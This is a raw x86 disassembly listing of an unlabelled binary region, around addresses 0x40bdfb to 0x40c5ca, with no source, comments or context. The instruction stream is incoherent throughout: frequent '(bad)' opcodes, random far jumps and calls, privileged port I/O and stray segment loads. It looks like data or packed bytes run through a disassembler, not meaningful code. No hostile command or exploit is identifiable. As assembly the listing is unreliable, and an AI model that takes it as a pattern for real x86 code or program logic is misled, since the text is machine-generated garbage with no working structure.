  40bdfb:	mov    esi,0x15fe19ad
  40be00:	jo     0x40be4a
  40be02:	inc    eax
  40be03:	dec    edi
  40be04:	scas   eax,DWORD PTR es:[edi]
  40be05:	push   edx
  40be06:	cmp    eax,0xf9add9ec
  40be0b:	les    ebp,FWORD PTR [ebx]
  40be0d:	xchg   DWORD PTR [edi],ebp
  40be0f:	adc    edi,ecx
  40be11:	mov    bh,0x53
  40be13:	out    dx,al
  40be14:	(bad)  
  40be18:	xchg   ecx,eax
  40be19:	jl     0x40be4c
  40be1b:	ficom  DWORD PTR [ecx-0x5ebe1f81]
  40be21:	push   ebp
  40be22:	aaa    
  40be23:	jmp    0x5052:0x382ad054
  40be2a:	jnp    0x40be49
  40be2c:	shl    ebp,1
  40be2e:	and    ecx,eax
  40be30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be33:	or     al,0x8f
  40be35:	mov    al,0x30
  40be37:	and    al,0x9e
  40be39:	je     0x40be28
  40be3b:	movq   mm7,mm3
  40be3e:	sub    cl,BYTE PTR [esi]
  40be40:	(bad)  
  40be41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be42:	test   al,0xae
  40be44:	mov    eax,0x61e25b46
  40be49:	shr    al,1
  40be4b:	popf   
  40be4c:	test   eax,0x1f257eb8
  40be51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be52:	and    al,0xd9
  40be54:	rol    eax,cl
  40be56:	cmp    edx,ebp
  40be58:	mov    bl,0x7f
  40be5a:	xchg   esp,eax
  40be5b:	push   ebp
  40be5c:	outs   dx,BYTE PTR ds:[esi]
  40be5d:	jp     0x40be45
  40be5f:	les    eax,FWORD PTR [edi+0x5ef4b2c1]
  40be65:	icebp  
  40be66:	je     0x40be61
  40be68:	test   eax,0xb028fec5
  40be6d:	xchg   BYTE PTR [eiz*4-0x5ae1e9b5],ah
  40be74:	jl     0x40beaa
  40be76:	mov    ah,0xf5
  40be78:	jl     0x40be8b
  40be7a:	(bad)  
  40be7b:	or     esp,edi
  40be7d:	mov    ch,0xc0
  40be7f:	imul   edi,DWORD PTR [edx],0x905def35
  40be85:	xchg   ebx,eax
  40be86:	jecxz  0x40bf05
  40be88:	fidivr DWORD PTR [ecx]
  40be8a:	fsubr  DWORD PTR [ebx+ecx*8+0x559dfadc]
  40be91:	mov    esi,0x652b5cef
  40be96:	xchg   ecx,eax
  40be97:	pop    ss
  40be98:	or     eax,0xb78eb26c
  40be9d:	lds    edx,FWORD PTR [eax*4+0x1a9dac38]
  40bea4:	scas   eax,DWORD PTR es:[edi]
  40bea5:	(bad)
  40bea9:	add    BYTE PTR [ebx-0x5a],dl
  40beac:	aam    0xe4
  40beae:	mov    es,WORD PTR [ebp+0x5515a838]
  40beb4:	imul   edx,ebp,0xd11b2dcf
  40beba:	inc    BYTE PTR [eax]
  40bebc:	ds data16 stc 
  40bebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec0:	cld    
  40bec1:	test   eax,0xab772541
  40bec6:	inc    edx
  40bec7:	test   bh,dh
  40bec9:	lds    esi,FWORD PTR [ebp+0x3a6c057f]
  40becf:	shr    DWORD PTR [ebx-0x5a15ecd8],cl
  40bed5:	or     eax,0x10b728df
  40beda:	stos   BYTE PTR es:[edi],al
  40bedb:	out    0xeb,eax
  40bedd:	or     cl,BYTE PTR [ebx]
  40bedf:	xchg   esi,eax
  40bee0:	ficomp WORD PTR [ecx+ebp*2-0x2ac40cfc]
  40bee7:	int    0xa8
  40bee9:	adc    DWORD PTR [edi-0x4a],0x1af6621
  40bef0:	mov    ch,0xd5
  40bef2:	je     0x40bec2
  40bef4:	adc    BYTE PTR [ecx],bh
  40bef6:	pop    ds
  40bef7:	ret    
  40bef8:	add    bh,dh
  40befa:	pop    edi
  40befb:	fcomp  st(2)
  40befd:	and    eax,0x63fe9543
  40bf02:	std    
  40bf03:	or     DWORD PTR ds:0x4cac8512,esp
  40bf09:	clc    
  40bf0a:	push   edi
  40bf0b:	(bad)  
  40bf0d:	mov    ds,WORD PTR [ebx+0x54f9855d]
  40bf13:	iret   
  40bf14:	std    
  40bf15:	jp     0x40beea
  40bf17:	in     eax,0x79
  40bf19:	test   BYTE PTR [ecx],0x6a
  40bf1c:	cmp    eax,0xe30059b8
  40bf21:	rep outs dx,BYTE PTR ds:[esi]
  40bf23:	xor    bh,BYTE PTR [esi]
  40bf25:	mov    edi,edi
  40bf27:	pop    edx
  40bf28:	mov    ds:0xc751d6ff,eax
  40bf2d:	ins    BYTE PTR es:[edi],dx
  40bf2e:	xor    BYTE PTR [ebx+0xf],al
  40bf31:	push   cs
  40bf32:	or     eax,0xa2d25d74
  40bf37:	mov    eax,DWORD PTR [ebx+eax*4-0x2e93e5de]
  40bf3e:	clc    
  40bf3f:	rcr    BYTE PTR [eax],cl
  40bf41:	loopne 0x40bf57
  40bf43:	aaa    
  40bf44:	mov    esi,0xc25bd6ad
  40bf49:	ror    dh,cl
  40bf4b:	push   ecx
  40bf4c:	jl     0x40bf6a
  40bf4e:	add    BYTE PTR ds:0xf25cc773,dh
  40bf54:	(bad)  
  40bf55:	dec    esi
  40bf56:	hlt    
  40bf57:	inc    esp
  40bf58:	in     eax,dx
  40bf59:	or     eax,DWORD PTR [esi-0x5946e1b]
  40bf5f:	retf   
  40bf60:	xchg   ah,dh
  40bf62:	inc    edi
  40bf63:	and    eax,0xd971ba2a
  40bf68:	xchg   esp,eax
  40bf69:	retf   0x9aa3
  40bf6c:	retf   0xd8db
  40bf6f:	jae    0x40bf1b
  40bf71:	cmp    edi,0xf79820a5
  40bf77:	(bad)  
  40bf79:	jmp    0x40bf8d
  40bf7b:	and    esi,DWORD PTR [ecx-0x1b]
  40bf7e:	test   BYTE PTR [ecx-0x7f59192a],ch
  40bf84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf85:	xchg   ecx,eax
  40bf86:	cli    
  40bf87:	ror    eax,1
  40bf89:	cmp    BYTE PTR [ecx+0x26c48a87],bh
  40bf8f:	test   eax,0x28bd3ebe
  40bf94:	(bad)  
  40bf95:	loopne 0x40bf31
  40bf97:	mov    al,0xa5
  40bf99:	pop    ds
  40bf9a:	and    DWORD PTR [ebx],edx
  40bf9c:	xor    eax,0x2dbcd972
  40bfa1:	jnp    0x40bfb8
  40bfa3:	cdq    
  40bfa4:	jbe    0x40bf48
  40bfa6:	or     eax,0x3d4e0d3a
  40bfab:	mov    esi,0x5949bee5
  40bfb0:	outs   dx,DWORD PTR ds:[esi]
  40bfb1:	add    BYTE PTR [ecx],cl
  40bfb3:	inc    esi
  40bfb4:	sbb    BYTE PTR [eax],0x99
  40bfb7:	mov    ch,bh
  40bfb9:	fs imul ecx,ebx,0xffffffdd
  40bfbd:	ins    DWORD PTR es:[edi],dx
  40bfbe:	add    ebp,DWORD PTR [esi]
  40bfc0:	inc    DWORD PTR [esi]
  40bfc2:	pop    esi
  40bfc3:	cmp    eax,0x96be4911
  40bfc8:	mov    esp,0xefa3d165
  40bfcd:	into   
  40bfce:	leave  
  40bfcf:	(bad)  
  40bfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfd1:	ins    BYTE PTR es:[edi],dx
  40bfd2:	jne    0x40bf82
  40bfd4:	sbb    ebp,edx
  40bfd6:	and    bh,BYTE PTR [edi+eiz*4-0x6]
  40bfda:	push   esi
  40bfdb:	lods   al,BYTE PTR ds:[esi]
  40bfdc:	and    cl,BYTE PTR [ebx+0x5d]
  40bfdf:	gs out 0x8a,eax
  40bfe2:	es enter 0x6db3,0x8b
  40bfe7:	into   
  40bfe8:	mov    DWORD PTR [eax-0x70],eax
  40bfeb:	repnz push ebx
  40bfed:	shr    BYTE PTR [edi-0x6ce7dcb],cl
  40bff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff4:	pop    ds
  40bff5:	mov    esp,ss
  40bff7:	mov    dh,0x3a
  40bff9:	das    
  40bffa:	aaa    
  40bffb:	xor    BYTE PTR [edx-0x77],dl
  40bffe:	mov    al,ds:0xcb05036b
  40c003:	fs xor al,0xea
  40c006:	push   0xffffffcc
  40c008:	jl     0x40bfa2
  40c00a:	add    eax,0x88654c8d
  40c00f:	ins    BYTE PTR es:[edi],dx
  40c010:	jae    0x40c066
  40c012:	sub    edi,DWORD PTR [ebx+0x424604c9]
  40c018:	add    BYTE PTR [ecx-0x15],dh
  40c01b:	dec    ebx
  40c01c:	push   ebp
  40c01d:	imul   edx,DWORD PTR [ecx+0x23],0x75
  40c021:	push   ecx
  40c022:	dec    eax
  40c023:	push   ss
  40c024:	push   0x745c7962
  40c029:	jl     0x40c004
  40c02b:	call   DWORD PTR [ebp-0x9bd1327]
  40c031:	push   edx
  40c032:	pop    eax
  40c033:	push   ss
  40c034:	iret   
  40c035:	mov    ch,0xf1
  40c037:	add    BYTE PTR [esi],dl
  40c039:	jmp    0x757b1784
  40c03e:	cdq    
  40c03f:	add    al,0x99
  40c041:	jp     0x40c056
  40c043:	dec    edi
  40c044:	jg     0x40c0c3
  40c046:	(bad)  
  40c048:	lods   eax,DWORD PTR ds:[esi]
  40c049:	mov    bh,0x8e
  40c04b:	addr16 loopne 0x40c0bd
  40c04e:	(bad)  
  40c04f:	cli    
  40c050:	retf   0x48f9
  40c053:	add    BYTE PTR [esi+edx*8+0x27d7c08],0x5d
  40c05b:	leave  
  40c05c:	test   al,0xfb
  40c05e:	pop    ebx
  40c05f:	adc    BYTE PTR [esi],0xc2
  40c062:	outs   dx,BYTE PTR ds:[esi]
  40c063:	das    
  40c064:	pop    es
  40c065:	(bad)  
  40c066:	enter  0x3d15,0xcb
  40c06a:	test   al,0x46
  40c06c:	in     eax,dx
  40c06d:	test   al,0x68
  40c06f:	sbb    dl,BYTE PTR [esp+ecx*4]
  40c072:	and    cl,ch
  40c074:	xchg   edx,eax
  40c075:	into   
  40c076:	int3   
  40c077:	sahf   
  40c078:	test   DWORD PTR [ebp+ebx*1-0x2e27741f],ebp
  40c07f:	test   BYTE PTR [eax+eiz*1+0x75],bl
  40c083:	int3   
  40c084:	lods   al,BYTE PTR ds:[esi]
  40c085:	es jnp 0x40c0be
  40c088:	and    bl,BYTE PTR [ebp-0x1cdc42db]
  40c08e:	not    BYTE PTR [eax-0x44146fc2]
  40c094:	pop    ds
  40c095:	adc    eax,0x59d546f6
  40c09a:	pop    ds
  40c09b:	adc    al,0x6f
  40c09d:	mov    dh,BYTE PTR [ecx+0x75ba8dd3]
  40c0a3:	mov    ah,BYTE PTR [edx]
  40c0a5:	fst    QWORD PTR [ebx+0x2b]
  40c0a8:	test   al,0xa1
  40c0aa:	aaa    
  40c0ab:	scas   eax,DWORD PTR es:[edi]
  40c0ac:	cdq    
  40c0ad:	and    BYTE PTR [eax],ah
  40c0af:	lds    ebp,FWORD PTR [eax]
  40c0b1:	fwait
  40c0b2:	inc    esp
  40c0b3:	jp     0x40c133
  40c0b5:	xchg   edx,eax
  40c0b6:	ins    DWORD PTR es:[edi],dx
  40c0b7:	fs add al,0xc
  40c0ba:	call   0x792b:0x88728901
  40c0c1:	pop    esi
  40c0c2:	mov    ecx,0x3a521553
  40c0c7:	call   0x695a:0x14846c5d
  40c0ce:	mov    bh,0xc7
  40c0d0:	out    dx,al
  40c0d1:	pusha  
  40c0d2:	xchg   esi,eax
  40c0d3:	jg     0x40c075
  40c0d5:	inc    ebx
  40c0d6:	int3   
  40c0d7:	mov    ds:0x1fc4493d,eax
  40c0dc:	jg     0x40c086
  40c0de:	lock mov ecx,0xcec447d6
  40c0e4:	pop    ds
  40c0e5:	je     0x40c0f9
  40c0e7:	xor    BYTE PTR [ebx+eax*2-0x6cad2b9c],ch
  40c0ee:	push   eax
  40c0ef:	push   0xffffffa3
  40c0f1:	adc    ecx,eax
  40c0f3:	clc    
  40c0f4:	mov    edx,0xe3473621
  40c0f9:	mov    eax,0xd992b91a
  40c0fe:	push   edx
  40c0ff:	inc    esp
  40c100:	(bad)  
  40c101:	loope  0x40c114
  40c103:	fs inc ecx
  40c105:	add    DWORD PTR [edx],edi
  40c107:	pop    ebp
  40c108:	(bad)
  40c10c:	iret   
  40c10d:	retf   
  40c10e:	sti    
  40c10f:	adc    BYTE PTR [esi],ah
  40c111:	hlt    
  40c112:	addr16 jge 0x40c184
  40c115:	xor    bl,0x60
  40c118:	push   esi
  40c119:	repz push ebx
  40c11b:	in     eax,dx
  40c11c:	out    0x7,eax
  40c11e:	push   ds
  40c11f:	and    BYTE PTR [edi-0x30],0x99
  40c123:	sub    DWORD PTR ds:0x3ff857e7,ecx
  40c129:	mov    bh,0xfd
  40c12b:	jns    0x40c1a4
  40c12d:	(bad)  
  40c12e:	dec    edx
  40c12f:	bound  esp,QWORD PTR cs:[ebp-0x3e337d68]
  40c136:	into   
  40c137:	add    DWORD PTR [eax+0x27],0xb20fbaa9
  40c13e:	fisub  WORD PTR [eax-0x62]
  40c141:	xor    ah,ah
  40c143:	or     DWORD PTR [ecx-0x67],esi
  40c146:	mov    ebx,0x5b21105a
  40c14b:	jl     0x40c150
  40c14d:	xchg   esi,eax
  40c14e:	jle    0x40c11d
  40c150:	inc    eax
  40c151:	jmp    0x24413043
  40c156:	fmul   QWORD PTR [ebx+0x4e]
  40c159:	call   0xf89d9503
  40c15e:	sbb    ecx,DWORD PTR [edx]
  40c160:	test   DWORD PTR [eax],esi
  40c162:	fwait
  40c163:	ja     0x40c18e
  40c165:	sub    al,0x4
  40c167:	pop    ds
  40c168:	mov    bh,0x8c
  40c16a:	data16 xor BYTE PTR [edx+ecx*2-0x2f61cfaf],ah
  40c172:	(bad)  
  40c174:	mov    WORD PTR [esi],ds
  40c176:	mov    ebp,DWORD PTR [ebx]
  40c178:	adc    al,0xfd
  40c17a:	mov    bh,0x97
  40c17c:	fadd   DWORD PTR [eax+0x79344d92]
  40c182:	ret    0x22bf
  40c185:	fld    QWORD PTR [edi+0x58]
  40c188:	push   ss
  40c189:	sbb    dl,0x2d
  40c18c:	xchg   BYTE PTR [ebp+edx*2-0x29ab707d],ah
  40c193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c194:	lods   eax,DWORD PTR ds:[esi]
  40c195:	sar    edi,cl
  40c197:	loopne 0x40c125
  40c199:	(bad)  
  40c19a:	loop   0x40c17a
  40c19c:	sar    ah,0x80
  40c19f:	ror    DWORD PTR [ebp+0x2ba82f43],0x9
  40c1a6:	cs xor al,0x50
  40c1a9:	inc    BYTE PTR [ebx]
  40c1ab:	mov    ah,BYTE PTR [eax-0x2a175d5]
  40c1b1:	jge    0x40c14d
  40c1b3:	cwd    
  40c1b5:	inc    ebp
  40c1b6:	mov    ds:0x6e5fad13,eax
  40c1bb:	sub    DWORD PTR [ebp+eiz*1-0x48],edi
  40c1bf:	(bad)  
  40c1c0:	sar    BYTE PTR [esi-0xa],1
  40c1c3:	pop    ecx
  40c1c4:	adc    DWORD PTR [ebp-0x77],eax
  40c1c7:	(bad)  
  40c1c8:	jno    0x40c14c
  40c1ca:	call   0x9a1b:0x657fd4b1
  40c1d1:	icebp  
  40c1d2:	fcmovne st,st(6)
  40c1d4:	cmp    ah,BYTE PTR [edi-0x5041b1e8]
  40c1da:	xor    BYTE PTR [edi],dl
  40c1dc:	aam    0x4
  40c1de:	stc    
  40c1df:	lods   al,BYTE PTR ds:[esi]
  40c1e0:	scas   eax,DWORD PTR es:[edi]
  40c1e1:	repz gs retf 
  40c1e4:	cmp    DWORD PTR [ecx],edx
  40c1e6:	push   cs
  40c1e7:	sub    bh,BYTE PTR [eax+0x60]
  40c1ea:	mov    DWORD PTR [ebx],ebx
  40c1ec:	loop   0x40c19c
  40c1ee:	mov    esi,0x8688fff7
  40c1f3:	mov    ch,0xe7
  40c1f5:	sahf   
  40c1f6:	push   ss
  40c1f7:	ficomp DWORD PTR [ecx+eax*2]
  40c1fa:	loop   0x40c26e
  40c1fc:	cdq    
  40c1fd:	ins    BYTE PTR es:[edi],dx
  40c1fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ff:	or     DWORD PTR ds:0xf0fc52,0x79de1acf
  40c209:	imul   esi,DWORD PTR [esp+esi*4+0x3e],0x43101fb3
  40c211:	mov    dl,0x56
  40c213:	jns    0x40c292
  40c215:	out    dx,eax
  40c216:	ror    DWORD PTR [ebx],0xc
  40c219:	aad    0xc0
  40c21b:	push   ecx
  40c21c:	push   di
  40c21e:	fwait
  40c21f:	scas   eax,DWORD PTR es:[edi]
  40c220:	dec    ecx
  40c221:	in     eax,dx
  40c222:	sub    DWORD PTR [ebp+0x54180967],0x48
  40c229:	pushf  
  40c22a:	test   DWORD PTR [ecx+0x2a63dd5],esp
  40c230:	xchg   edi,eax
  40c231:	push   edi
  40c232:	clc    
  40c233:	into   
  40c234:	fwait
  40c235:	(bad)  
  40c236:	cld    
  40c237:	dec    BYTE PTR [ecx+0x13]
  40c23a:	push   edi
  40c23b:	retf   
  40c23c:	xchg   edx,eax
  40c23d:	arpl   di,bp
  40c23f:	les    edx,FWORD PTR [esi-0x61d12f2f]
  40c245:	push   ecx
  40c246:	call   0x52116c3e
  40c24b:	imul   edi,DWORD PTR [edi],0xffffffd6
  40c24e:	lds    edx,FWORD PTR cs:[edi]
  40c251:	mov    eax,ds:0x27f50745
  40c256:	out    0xdc,al
  40c258:	add    BYTE PTR [ecx+0x5590ae0d],dl
  40c25e:	loopne 0x40c2d8
  40c260:	ins    DWORD PTR es:[edi],dx
  40c261:	popa   
  40c262:	or     eax,0x81eb3f08
  40c267:	jge    0x40c29e
  40c269:	out    0xe0,al
  40c26b:	xor    BYTE PTR [ecx+ebx*1-0x34cb0b1f],ah
  40c272:	mov    ch,BYTE PTR es:[eax+esi*2-0x1aa911d0]
  40c27a:	sbb    dl,bl
  40c27c:	pop    edi
  40c27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c27e:	dec    eax
  40c27f:	jmp    0xddab888d
  40c284:	lock xchg edi,eax
  40c286:	lods   eax,DWORD PTR ds:[esi]
  40c287:	xor    DWORD PTR [eax+0x7b],0x4a
  40c28b:	jae    0x40c2ae
  40c28d:	sub    DWORD PTR [ecx-0x5d0162b],edx
  40c293:	(bad)  
  40c294:	dec    edx
  40c295:	ret    
  40c296:	add    dh,BYTE PTR [esi]
  40c298:	mov    dh,0x88
  40c29a:	sar    BYTE PTR [eax-0x7f36da5f],0x33
  40c2a1:	bound  ebx,QWORD PTR [edi+0x26]
  40c2a4:	adc    al,0xf5
  40c2a6:	fist   WORD PTR [ebp+0x61]
  40c2a9:	push   esi
  40c2aa:	in     al,dx
  40c2ab:	fidiv  WORD PTR [eax-0x3db7d13c]
  40c2b1:	push   ebx
  40c2b2:	int    0xe5
  40c2b4:	jno    0x40c312
  40c2b6:	jne    0x40c268
  40c2b8:	jp     0x40c258
  40c2ba:	loope  0x40c23e
  40c2bc:	sahf   
  40c2bd:	xchg   esp,eax
  40c2be:	cmp    DWORD PTR [esi+0x10],esi
  40c2c1:	dec    edx
  40c2c2:	int3   
  40c2c3:	adc    BYTE PTR [eax+0x7],bl
  40c2c6:	mov    edi,0x1416becd
  40c2cb:	xor    BYTE PTR [edx-0xa],bl
  40c2ce:	xchg   ecx,eax
  40c2cf:	sub    esi,DWORD PTR [esi-0x48836d15]
  40c2d5:	mov    ah,ch
  40c2d7:	ss in  eax,0x0
  40c2da:	cmp    bh,bl
  40c2dc:	(bad)  
  40c2dd:	adc    ah,dl
  40c2df:	and    eax,0x988f98be
  40c2e4:	add    ah,0x22
  40c2e7:	shr    DWORD PTR [ebx-0x4d],cl
  40c2ea:	pop    ecx
  40c2eb:	xor    al,0xbe
  40c2ed:	mov    esp,0x4e0a1bde
  40c2f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2f3:	or     esi,DWORD PTR [edx]
  40c2f5:	dec    eax
  40c2f6:	inc    edx
  40c2f7:	jg     0x40c2e8
  40c2f9:	sub    cl,BYTE PTR [esi]
  40c2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2fc:	push   ss
  40c2fd:	xchg   esp,eax
  40c2fe:	ss iret 
  40c300:	xchg   ebx,eax
  40c301:	push   edx
  40c302:	out    dx,al
  40c303:	das    
  40c304:	pop    ds
  40c305:	and    esi,DWORD PTR [ebx+0xf]
  40c308:	adc    al,0xf5
  40c30a:	dec    eax
  40c30b:	lea    esi,[esi]
  40c30d:	bound  edi,QWORD PTR [ecx+edi*8]
  40c310:	scas   al,BYTE PTR es:[edi]
  40c311:	push   edx
  40c312:	mov    ah,0x93
  40c314:	pop    DWORD PTR ds:0x662c6d74
  40c31a:	lods   eax,DWORD PTR ds:[esi]
  40c31b:	dec    ebx
  40c31c:	xor    dl,BYTE PTR [edx-0x13966a36]
  40c322:	repz je 0x40c33c
  40c325:	in     eax,0x20
  40c327:	and    DWORD PTR [esi-0x14],0x8e16d065
  40c32e:	aaa    
  40c32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c330:	sub    DWORD PTR [edx+0x5537a5b],edi
  40c336:	cwde   
  40c337:	loop   0x40c2c5
  40c339:	outs   dx,BYTE PTR ds:[esi]
  40c33a:	mov    edx,0x3952e3c5
  40c33f:	xlat   BYTE PTR ds:[ebx]
  40c340:	jnp    0x40c2f7
  40c342:	sub    ecx,DWORD PTR [ebp-0x1f07079b]
  40c348:	sbb    al,0x23
  40c34a:	pushf  
  40c34b:	pop    ecx
  40c34c:	add    BYTE PTR [edx+edx*1-0x61660236],bl
  40c353:	jmp    0x40c32d
  40c355:	lods   al,BYTE PTR ds:[esi]
  40c356:	lods   eax,DWORD PTR ds:[esi]
  40c357:	pop    ecx
  40c358:	push   eax
  40c359:	pop    ss
  40c35a:	dec    edi
  40c35b:	xchg   ebx,ecx
  40c35d:	jmp    0x44a3:0x74b8645b
  40c364:	adc    ch,BYTE PTR [ecx+0x7f]
  40c367:	jmp    0x40c2f1
  40c369:	leave  
  40c36a:	loop   0x40c3c0
  40c36c:	aam    0x46
  40c36e:	test   DWORD PTR [ebx-0x80],eax
  40c371:	add    DWORD PTR [ebx],0x17bbe1bd
  40c377:	dec    ecx
  40c378:	ror    DWORD PTR [edi-0x74],0xec
  40c37c:	outs   dx,DWORD PTR ds:[esi]
  40c37d:	aas    
  40c37e:	mov    ecx,0xd9b9c85b
  40c383:	jle    0x40c3ed
  40c385:	xchg   ecx,eax
  40c386:	fldl2e 
  40c388:	retf   
  40c389:	cmp    al,0xc8
  40c38b:	pop    edi
  40c38c:	neg    DWORD PTR [eax]
  40c38e:	fiadd  WORD PTR [edx-0x5e93dcd8]
  40c394:	xchg   esp,eax
  40c395:	addr16 inc edx
  40c397:	xor    eax,0xa87a422a
  40c39c:	repnz add al,0xa
  40c39f:	sbb    BYTE PTR [ebp-0x7c36501c],dl
  40c3a5:	leave  
  40c3a6:	fdiv   DWORD PTR [eax]
  40c3a8:	pop    ebx
  40c3a9:	or     al,0x33
  40c3ab:	es js  0x40c351
  40c3ae:	popf   
  40c3af:	push   edi
  40c3b0:	lock cwde 
  40c3b2:	mov    bl,0x8d
  40c3b4:	dec    ecx
  40c3b5:	adc    ah,dl
  40c3b7:	cmp    sp,WORD PTR [esi]
  40c3ba:	sbb    dl,dl
  40c3bc:	rol    DWORD PTR [edx],cl
  40c3be:	mov    bl,BYTE PTR [eax-0x6b3d2050]
  40c3c4:	pop    esp
  40c3c5:	dec    esp
  40c3c6:	mov    esp,0x43890ffc
  40c3cb:	or     DWORD PTR ds:[ebp+0x62],edi
  40c3cf:	(bad)  
  40c3d0:	adc    bl,BYTE PTR [ecx+0x2f92c19b]
  40c3d6:	addr16 pop esi
  40c3d8:	mov    fs,esp
  40c3da:	xchg   esi,eax
  40c3db:	jno    0x40c3b6
  40c3dd:	data16 test BYTE PTR es:[ebx],bl
  40c3e1:	mov    al,0xdc
  40c3e3:	pop    esp
  40c3e4:	or     eax,0x3812c9ed
  40c3e9:	and    dh,bl
  40c3eb:	aas    
  40c3ec:	or     eax,0x9e0ba9f9
  40c3f1:	out    0xbc,al
  40c3f3:	cli    
  40c3f4:	icebp  
  40c3f5:	mov    edx,0x9a531724
  40c3fa:	test   DWORD PTR [eax-0x29],ebp
  40c3fd:	or     esi,DWORD PTR [edi-0xa9160a6]
  40c403:	push   DWORD PTR [ebp-0xa]
  40c406:	pop    edx
  40c407:	jno    0x40c3bc
  40c409:	pusha  
  40c40a:	fwait
  40c40b:	pop    esi
  40c40c:	fcos   
  40c40e:	cmp    dh,BYTE PTR [ebp*2+0x6a41511a]
  40c415:	loopne 0x40c3c2
  40c417:	iret   
  40c418:	in     al,0x23
  40c41a:	dec    esi
  40c41b:	xor    BYTE PTR [edx+edx*8-0x1a],bh
  40c41f:	sub    al,0xa7
  40c421:	bound  edi,QWORD PTR [esi+0x540186b4]
  40c427:	data16 das 
  40c429:	cdq    
  40c42a:	lahf   
  40c42b:	jns    0x40c441
  40c42d:	xchg   edx,eax
  40c42e:	test   DWORD PTR [ecx-0x57],eax
  40c431:	mov    edx,0x9689cfe3
  40c436:	sbb    DWORD PTR [esi],edx
  40c438:	mov    ebx,edx
  40c43a:	pop    esi
  40c43b:	inc    edi
  40c43c:	mul    BYTE PTR [ebp+eax*1-0x3cecc359]
  40c443:	and    dl,BYTE PTR [edi-0x7d]
  40c446:	iret   
  40c447:	imul   esp,ebx,0xad5437a9
  40c44d:	out    0xf7,eax
  40c44f:	out    dx,eax
  40c450:	sbb    BYTE PTR ds:[edx+0x43],al
  40c454:	dec    ebx
  40c455:	jae    0x40c489
  40c457:	sbb    ebx,DWORD PTR es:[esi]
  40c45a:	adc    eax,0xd89d0a29
  40c45f:	sub    al,0x9d
  40c461:	push   ss
  40c462:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c464:	mov    al,0xdb
  40c466:	stc    
  40c467:	(bad)  
  40c468:	in     al,dx
  40c469:	jnp    0x40c44b
  40c46b:	xor    bh,bl
  40c46d:	repz cs retf 0x3806
  40c472:	in     al,0xda
  40c474:	shl    al,1
  40c476:	shl    BYTE PTR [ebx+0x41768dab],0xf1
  40c47d:	fdivr  QWORD PTR [edx+0x3d0064f2]
  40c483:	loopne 0x40c434
  40c485:	lea    ebx,es:[ebx]
  40c488:	or     DWORD PTR [edx],0xbd44673a
  40c48e:	and    eax,0xb591b822
  40c493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c494:	inc    edi
  40c495:	lds    eax,FWORD PTR [eax+0x0]
	...
  40c513:	add    BYTE PTR [esi],ah
  40c515:	ss pop ecx
  40c517:	sbb    BYTE PTR [ecx+0x7f],bl
  40c51a:	addr16 ds loope 0x40c540
  40c51e:	dec    edx
  40c51f:	inc    esp
  40c520:	pop    ebx
  40c521:	cwde   
  40c522:	push   ds
  40c523:	xor    bh,bh
  40c525:	je     0x40c527
  40c527:	add    BYTE PTR [ebx+0x7],ch
  40c52a:	add    BYTE PTR [eax],al
  40c52c:	(bad)  
  40c52d:	es push 0xffffff85
  40c530:	sub    ch,bl
  40c532:	mov    edx,0x6e66bff7
  40c537:	in     eax,0x7
  40c539:	inc    edx
  40c53a:	stos   BYTE PTR es:[edi],al
  40c53b:	(bad)  
  40c53c:	or     eax,DWORD PTR [ebx]
  40c53e:	xor    eax,0x15cef2fc
  40c543:	mov    DWORD PTR [edi+0x36dfd5f2],ebp
  40c549:	jnp    0x40c53e
  40c54b:	pop    edi
  40c54c:	mov    ds:0xb2b19e95,eax
  40c551:	lahf   
  40c552:	jmp    0x98c0a1b4
  40c557:	mov    cl,0x22
  40c559:	cmc    
  40c55a:	cmp    DWORD PTR [ecx-0x75],ecx
  40c55d:	stos   DWORD PTR es:[edi],eax
  40c55e:	call   DWORD PTR [ecx+0x48]
  40c561:	dec    ebx
  40c562:	ins    DWORD PTR es:[edi],dx
  40c563:	sub    cl,0xb1
  40c566:	retf   0x6c7f
  40c569:	and    DWORD PTR [esi-0x10],edx
  40c56c:	push   cs
  40c56d:	cs in  al,0xae
  40c570:	dec    esi
  40c571:	cmp    ch,BYTE PTR [edx+0x67e9b564]
  40c577:	xchg   ebp,eax
  40c578:	mov    esi,0xbc4cf5ce
  40c57d:	test   al,0x96
  40c57f:	mov    dl,0xc5
  40c581:	cmp    eax,0x57119b5f
  40c586:	cmp    al,0xe3
  40c588:	adc    bh,BYTE PTR [eax]
  40c58a:	sub    esi,DWORD PTR [edx]
  40c58c:	xchg   ebx,eax
  40c58d:	(bad)  
  40c58e:	in     eax,0x8c
  40c590:	cmp    DWORD PTR [edx-0x429365aa],edi
  40c596:	xchg   edi,eax
  40c597:	fidiv  DWORD PTR [ecx]
  40c599:	cmc    
  40c59a:	mov    al,0x5c
  40c59c:	mov    ecx,0x4e4d7df8
  40c5a1:	imul   ebp,DWORD PTR [esi+0x2a98a50b],0x8ae5afbc
  40c5ab:	shl    BYTE PTR [esi-0x1cbabe2e],1
  40c5b1:	cwde   
  40c5b2:	es or  eax,esp
  40c5b5:	popa   
  40c5b6:	lods   eax,DWORD PTR ds:[esi]
  40c5b7:	shr    ebp,0xbb
  40c5ba:	lods   eax,DWORD PTR ds:[esi]
  40c5bb:	sbb    al,0x52
  40c5bd:	popa   
  40c5be:	jno    0x40c59d
  40c5c0:	add    eax,DWORD PTR [eax+edi*1]
  40c5c3:	lods   eax,DWORD PTR ds:[esi]
  40c5c4:	add    ch,al
  40c5c6:	repnz cmp al,0x20
  40c5c9:	scas   eax,DWORD PTR es:[edi]
  40c5ca:	sbb    al,0xa1
